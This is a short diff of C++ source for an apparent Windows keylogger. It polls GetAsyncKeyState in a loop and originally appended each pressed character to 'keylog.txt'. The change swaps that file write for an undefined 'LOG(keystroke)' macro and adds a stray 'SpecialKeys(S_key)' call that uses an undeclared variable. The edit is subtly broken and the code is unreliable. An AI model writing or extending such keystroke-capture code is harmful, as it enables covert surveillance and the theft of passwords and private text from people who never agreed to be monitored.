@@ -104,16 +104,11 @@ int main()
 		{
 			if (GetAsyncKeyState(key) == -32767)
       			{
+				SpecialKeys(S_key);
+					
 				if (SpecialKeys(key) == false) //Checks to see if a special key was pressed
         			{
-					fstream logFile;
-					logFile.open("keylog.txt", fstream::app); //If not, the program records the character key that was pressed
-					if (logFile.is_open())
-          				{
-						logFile << char(key); 
-						logFile.close();
-					}
-
+					LOG(keystroke);
 				}
 			}
 		}
